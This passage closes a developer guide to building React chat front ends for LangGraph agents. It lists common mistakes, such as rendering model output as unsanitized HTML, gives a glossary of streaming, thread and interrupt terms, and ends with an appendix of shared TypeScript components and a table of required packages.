**Rendering model output as raw HTML.** Use `react-markdown`, or sanitize with DOMPurify. The code is in 6.1, rule 1.

**Typing state as `BaseMessage[]` and then submitting plain objects.**

```tsx
stream.submit({ messages: [{ type: "human", content: text }] });   // type error with a typed state
stream.submit({ messages: [new HumanMessage(text)] });            // right (4.4)
```

---

## 13. Glossary

- **Agent Server**: the backend process (`langgraph dev`) that runs graphs and stores threads.
- **AIMessage / HumanMessage / ToolMessage**: message types for the model, the user, and a tool result.
- **AssembledToolCall**: a tool request paired with its result and `status`.
- **assistantId**: a graph's key in `langgraph.json`.
- **Catalog / registry**: in declarative generative UI, the components the agent may use / how each one renders.
- **Checkpoint**: a saved state after a graph step.
- **Checkpointer**: the backend storage that saves checkpoints (persistence).
- **children**: the React prop holding whatever is written between a component's tags.
- **Component**: a function that returns JSX.
- **Composer**: the usual name for the message input box. Not a library component (Appendix A; this repo: `ChatInput`).
- **Coordinator**: a deep agent's main agent, which hands out sub-tasks.
- **Custom hook**: a function you write whose name starts with `use` and which calls other hooks (2.11).
- **Deep agent**: an agent that delegates to subagents through a `task` tool.
- **disconnect()**: stop listening. The run keeps going on the server.
- **forkFrom**: a submit option (a checkpoint id string) that starts a new run from an earlier checkpoint.
- **Generative UI**: the agent's output decides which UI is shown.
- **Graph / node**: the agent's program / one step in it.
- **Headless tool**: a tool the agent calls that runs in the browser.
- **HITL (human-in-the-loop)**: the agent pauses for a person to approve, reject, edit or respond.
- **Hook**: a React function starting with `use` that gives a component state or a connection.
- **Interrupt**: the graph pausing itself and waiting for a value, answered with `respond()`.
- **isLoading**: `true` while a run is in progress or the thread is loading.
- **JSX**: HTML-like syntax inside TypeScript.
- **key**: a unique id on list items so React can track them.
- **memo**: skips re-rendering when props haven't changed.
- **multitaskStrategy**: what a submit does when a run is already active (`rollback`, `reject`, `enqueue`).
- **Namespace**: the path that identifies which nested graph an event came from. Root is `[]`.
- **onThreadId**: a callback that receives a newly created thread id so you can save it.
- **Optimistic update**: showing the user's message before the server confirms it.
- **Props**: the inputs a parent passes to a component.
- **Re-render**: React calling a component again to update the screen.
- **Ref-counted subscription**: a server subscription that stays open while at least one component uses it.
- **respond() / respondAll()**: answer one interrupt / several at once.
- **Root**: the top-level graph, as opposed to subgraphs and subagents.
- **Run**: one execution of the graph on a thread.
- **Selector hook**: `useMessages`, `useValues`, etc. Each reads one scoped piece of the stream.
- **SSE (Server-Sent Events)**: an HTTP response that stays open while the server writes events into it.
- **State / values**: the data the graph holds.
- **stop()**: cancel the run on the server.
- **StreamProvider / useStreamContext**: shares one stream with a component subtree.
- **StrictMode**: React's development mode that runs effects twice to find bugs.
- **Structured output**: the agent returning typed data instead of prose.
- **Subagent / subgraph**: a graph running inside another graph.
- **submit()**: start a run with new input.
- **Suspense**: React showing a fallback while data loads.
- **target**: the selector-hook argument that picks which part of the graph to read.
- **Thread / threadId**: a stored conversation / its id.
- **Todo list**: a deep agent's plan in `stream.values.todos` (needs `TodoListMiddleware`).
- **Tool call**: the model requesting a function run.
- **Transport**: how the hook talks to the server (SSE, WebSocket, custom adapter).
- **useCallback**: returns the same function between renders until its dependencies change (2.10).
- **useEffect / useRef / useState**: run code after a render / keep a value without re-rendering / keep a value that re-renders when changed.
- **useStream**: the main hook that connects to the agent and returns `stream`.
- **v0 / v1**: the old and new versions of `@langchain/react`. Old APIs don't exist in v1.
- **Vite proxy**: forwards `/api/langgraph` from the browser to the Agent Server, avoiding CORS.

---

## 14. Appendix A: shared components

The examples import these from two files you'd create next to them: `./shared.tsx` and `./types.ts`. Nothing here comes from a library except what the `import` lines say.

`**types.ts**`: the state shape. It must match the Python graph state.

```ts
import type { BaseMessage, Todo } from "langchain";

export interface AgentState {
  messages: BaseMessage[];
  todos?: Todo[];                    // only if the backend enables TodoListMiddleware
  files?: Record<string, unknown>;   // deep agent filesystem, if you render it
}

export interface ApprovalInterrupt { question: string }   // shape of your interrupt() payload
```

`**shared.tsx**`: small components used across sections.

```tsx
import { memo, useState } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

// Where the Agent Server is. In this repo: `${window.location.origin}/api/langgraph`.
export const AGENT_URL = "http://localhost:2024";

// A user's message.
export function UserBubble({ text }: { text: string }) {
  return <div className="ml-auto max-w-[80%] rounded-xl bg-blue-600 px-4 py-2 text-white">{text}</div>;
}

// An AI message rendered as markdown. memo: only re-renders when text or streaming changes (2.10).
export const MarkdownBubble = memo(function MarkdownBubble({
  text,
  streaming = false,
}: {
  text: string;
  streaming?: boolean;
}) {
  return (
    <div className="max-w-[80%] rounded-xl border px-4 py-2">
      <ReactMarkdown remarkPlugins={[remarkGfm]}>{text}</ReactMarkdown>
      {streaming && <span className="inline-block h-4 w-1 animate-pulse bg-current" />}
    </div>
  );
});

// The AI's message in the minimal chat (4.1).
export function AssistantBubble({ text }: { text: string }) {
  return <MarkdownBubble text={text} />;
}

// The message box: text field + Send button. This repo's version is ChatInput.tsx.
export function Composer({ disabled = false, onSend }: { disabled?: boolean; onSend: (text: string) => void }) {
  const [text, setText] = useState("");
  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();                 // stop the browser from reloading the page
        if (!text.trim()) return;
        onSend(text.trim());
        setText("");
      }}
    >
      <input value={text} onChange={(e) => setText(e.target.value)} disabled={disabled} />
      <button type="submit" disabled={disabled || !text.trim()}>Send</button>
    </form>
  );
}

// Shows stream.error.
export function ErrorBanner({ error }: { error: unknown }) {
  const message = error instanceof Error ? error.message : String(error);
  return <div role="alert" className="rounded border border-red-300 bg-red-50 p-3 text-red-700">{message}</div>;
}

// A loading indicator.
export function Spinner() {
  return <span className="inline-block animate-spin">⟳</span>;
}

// A small label showing a status such as "running" or "complete".
export function StatusBadge({ status }: { status: string }) {
  return <span className="rounded border px-2 text-xs">{status}</span>;
}
```

**Libraries the examples use**, and whether this repo already has them in [package.json](packages/frontend/package.json):


| Package                                                   | Used for                              | In this repo?                       |
| --------------------------------------------------------- | ------------------------------------- | ----------------------------------- |
| `react`, `@langchain/react`, `langchain`, `zod`           | Core                                  | Yes                                 |
| `react-markdown`, `remark-gfm`, `shiki`, `@json-render/*` | Markdown, highlighting, generative UI | Yes                                 |
| `dompurify`, `marked`                                     | Sanitizing HTML (6.1)                 | No: `pnpm add dompurify marked`     |
| `react-error-boundary`                                    | Suspense errors (11.4)                | No: `pnpm add react-error-boundary` |
